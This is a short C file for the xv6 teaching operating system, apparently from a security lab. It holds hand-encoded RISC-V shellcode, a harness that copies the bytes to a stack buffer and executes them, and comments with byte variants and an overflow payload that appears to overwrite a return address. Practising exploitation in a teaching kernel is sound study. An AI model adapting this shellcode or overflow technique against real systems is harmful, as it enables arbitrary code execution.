#include "kernel/types.h"
#include "user/user.h"

// \xef\x02\x40\x02\x13\x85\x40\x06\x13\x05\xc5\xf9\x08\xe5\x93\x05\xe5\xff\xa9\x05\x33\x48\x08\x01\x23\x38\x05\x01\x67\x08\x08\x2e\x33\x48\x08\x01\xef\xf0\x1f\xfe\x73\x68
// \xef\x02\x40\x02\x13\x85\x40\x06\x13\x05\xc5\xf9\x08\xe5\x93\x05\xe5\xff\xa9\x05\x33\x48\x08\x01\x23\x38\x05\x01\x67\x08\x68\x33\x33\x48\x08\x01\xef\xf0\x1f\xfe\x73\x68
// \xef\x02\x40\x02\x13\x85\x40\x06\x13\x05\xc5\xf9\x08\xe5\x93\x05\xe5\xff\xa9\x05\x33\x48\x08\x01\x23\x38\x05\x01\x67\x08\xe8\x35\x33\x48\x08\x01\xef\xf0\x1f\xfe\x73\x68
// ef 02 40 02 13 85 40 06 13 05 c5 f9 08 e5 93 05 e5 ff a9 05 33 48 08 01 23 38 05 01 67 08 88 39 33 48 08 01 ef f0 1f fe 73 68 00 62 62 62 62 62 62 62 62 62 62 62 62 62 53 53 53 53 53 53 53 53 46 46 46 46 46 46 46 46 80 4f 00 00 00 00 00 00
char *shellcode =
    "\xef\x02\x40\x02"
    "\x13\x85\x40\x06"
    "\x13\x05\xc5\xf9"
    "\x08\xe5"
    "\x93\x05\xe5\xff"
    "\xa9\x05"
    "\x33\x48\x08\x01"
    "\x23\x38\x05\x01"
    "\x67\x08\x08\x2e"
    "\x33\x48\x08\x01"
    "\xef\xf0\x1f\xfe"
    "\x73\x68"
    ;

int
main()
{
//     int *ret;
// 
//     ret = (int *)&ret + 2;
//     (*ret) = (int)shellcode;
    char payload[50];

    memcpy(payload, shellcode, 50);

    (*(void(*)()) payload) ();
    
    return 0;
}
